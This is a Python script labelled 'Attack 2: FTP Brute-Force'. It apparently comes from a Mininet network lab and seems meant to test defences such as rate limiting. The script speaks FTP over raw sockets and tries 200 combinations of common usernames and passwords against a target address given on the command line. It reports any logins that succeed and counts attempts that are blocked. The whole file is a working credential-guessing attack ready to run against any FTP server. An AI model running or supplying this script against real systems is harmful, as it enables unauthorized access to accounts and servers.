#!/usr/bin/env python3
"""
Attack 2: FTP Brute-Force
Tries a list of username:password pairs against an FTP server using the
FTP protocol implemented from scratch over plain TCP sockets.
FTP authentication is cleartext, so no cryptographic library is needed.

Standard library only -- no external dependencies.

Usage (from mininet CLI):
    internet python3 attacks/attack_2.py 10.12.0.40
    internet python3 attacks/attack_2.py 10.12.0.40 21
"""

import socket
import sys
import time

USERNAMES = [
    "root", "admin", "mininet", "ftp", "anonymous",
    "user", "guest", "ftpuser", "test", "ubuntu",
]

PASSWORDS = [
    "", "123456", "password", "12345678", "qwerty",
    "abc123", "111111", "letmein", "monkey", "dragon",
    "master", "login", "pass", "admin", "root",
    "toor", "ftp", "guest", "test", "mininet",
]

# All username x password combinations
CREDENTIALS = [(u, p) for u in USERNAMES for p in PASSWORDS]

TIMEOUT = 5      # seconds per connection attempt
DELAY   = 0.2    # seconds between attempts


def ftp_read(sock):
    """Read a full FTP response (may span multiple lines)."""
    data = b""
    while True:
        chunk = sock.recv(1024)
        if not chunk:
            break
        data += chunk
        lines = data.split(b"\r\n")
        for line in lines:
            if len(line) >= 4 and line[:3].isdigit() and line[3:4] == b" ":
                return data.decode(errors="ignore")
        if data.endswith(b"\r\n"):
            break
    return data.decode(errors="ignore")


def try_login(host, port, username, password):
    """
    Attempt one FTP login.
    Returns:
      True  -- login accepted (230)
      False -- login rejected by server (530)
      None  -- connection failed/blocked (timeout, refused, etc.)
    """
    try:
        sock = socket.create_connection((host, port), timeout=TIMEOUT)
        ftp_read(sock)                                  # 220 banner

        sock.sendall(f"USER {username}\r\n".encode())
        ftp_read(sock)                                  # 331

        sock.sendall(f"PASS {password}\r\n".encode())
        response = ftp_read(sock)                       # 230 or 530

        sock.sendall(b"QUIT\r\n")
        sock.close()

        return response.startswith("230")

    except socket.timeout:
        return None
    except (ConnectionRefusedError, OSError):
        return None
    except Exception:
        return None


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21

    print(f"[*] FTP brute-force -> {host}:{port}")
    print(f"[*] Trying {len(CREDENTIALS)} credential pairs\n")

    found    = []
    rejected = 0
    blocked  = 0

    for username, password in CREDENTIALS:
        label = f"{username}:{password}" if password else f"{username}:(empty)"
        print(f"  {label} ... ", end="", flush=True)

        result = try_login(host, port, username, password)

        if result is True:
            print("SUCCESS")
            found.append((username, password))
        elif result is False:
            print("rejected")
            rejected += 1
        else:
            print("blocked/timeout")
            blocked += 1

        time.sleep(DELAY)

    print()
    print(f"[*] Attempts : {len(CREDENTIALS)} total")
    print(f"[*]   {len(found)} successful")
    print(f"[*]   {rejected} rejected (wrong credentials)")
    print(f"[*]   {blocked} blocked/timeout (rate-limit active?)")

    if found:
        print("[+] Valid credentials found:")
        for u, p in found:
            print(f"    {u}:{p if p else '(empty)'}")
    else:
        print("[-] No valid credentials found.")


if __name__ == "__main__":
    main()
